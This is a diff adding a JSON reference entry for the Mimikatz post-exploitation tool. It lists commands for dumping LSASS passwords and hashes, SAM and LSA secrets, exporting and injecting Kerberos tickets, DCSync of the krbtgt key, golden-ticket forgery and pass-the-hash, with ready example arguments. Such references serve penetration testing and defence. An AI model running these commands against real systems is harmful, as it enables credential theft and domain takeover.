@@ -1,0 +1,102 @@
+{
+  "tool": "mimikatz",
+  "name": "Mimikatz",
+  "description": "The classic Windows post-exploitation tool for extracting plaintext passwords, hashes and Kerberos tickets from memory, and for pass-the-hash, pass-the-ticket and golden-ticket attacks.",
+  "tags": [
+    "Active Directory",
+    "credentials",
+    "Kerberos",
+    "post-exploitation"
+  ],
+  "homepage": "https://github.com/gentilkiwi/mimikatz",
+  "docs": "https://github.com/gentilkiwi/mimikatz/wiki",
+  "install": {
+    "other": "Download signed binaries from https://github.com/gentilkiwi/mimikatz/releases"
+  },
+  "related": [
+    "impacket",
+    "crackmapexec",
+    "rubeus",
+    "certipy"
+  ],
+  "total_commands": 11,
+  "commands": [
+    {
+      "id": 1,
+      "category": "Credentials",
+      "command": "privilege::debug",
+      "example": "privilege::debug",
+      "explanation": "Enables the debug privilege; most credential commands need it. Run mimikatz as administrator first."
+    },
+    {
+      "id": 2,
+      "category": "Credentials",
+      "command": "sekurlsa::logonpasswords",
+      "example": "sekurlsa::logonpasswords",
+      "explanation": "Dumps plaintext passwords, NT hashes and Kerberos tickets for logged-on users from LSASS memory."
+    },
+    {
+      "id": 3,
+      "category": "Credentials",
+      "command": "sekurlsa::ekeys",
+      "example": "sekurlsa::ekeys",
+      "explanation": "Extracts Kerberos encryption keys, including AES, from memory."
+    },
+    {
+      "id": 4,
+      "category": "Credentials",
+      "command": "lsadump::sam",
+      "example": "lsadump::sam",
+      "explanation": "Dumps local account hashes from the SAM."
+    },
+    {
+      "id": 5,
+      "category": "Credentials",
+      "command": "lsadump::lsa /patch",
+      "example": "lsadump::lsa /patch",
+      "explanation": "Dumps LSA secrets and cached domain credentials."
+    },
+    {
+      "id": 6,
+      "category": "Kerberos tickets",
+      "command": "sekurlsa::tickets /export",
+      "example": "sekurlsa::tickets /export",
+      "explanation": "Exports all Kerberos tickets in memory to .kirbi files for pass-the-ticket."
+    },
+    {
+      "id": 7,
+      "category": "Kerberos tickets",
+      "command": "kerberos::ptt <ticket>.kirbi",
+      "example": "kerberos::ptt ticket.kirbi",
+      "explanation": "Injects a ticket into the current session (pass-the-ticket)."
+    },
+    {
+      "id": 8,
+      "category": "Kerberos tickets",
+      "command": "lsadump::dcsync /domain:<domain> /user:<user>",
+      "example": "lsadump::dcsync /domain:corp.local /user:krbtgt",
+      "explanation": "DCSync: pulls a user’s hashes from a DC, famously the krbtgt key for golden tickets."
+    },
+    {
+      "id": 9,
+      "category": "Kerberos tickets",
+      "command": "kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash> /ptt",
+      "example": "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-111-222-333 /krbtgt:abc123 /ptt",
+      "explanation": "Forges and injects a golden ticket from the krbtgt hash."
+    },
+    {
+      "id": 10,
+      "category": "Pass-the-hash",
+      "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:<cmd>",
+      "example": "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe",
+      "explanation": "Starts a process in the context of a user using only their NT hash."
+    },
+    {
+      "id": 11,
+      "category": "Pass-the-hash",
+      "command": "crypto::capi / crypto::cng",
+      "example": "crypto::capi / crypto::cng",
+      "explanation": "Makes non-exportable certificate private keys exportable."
+    }
+  ]
+}
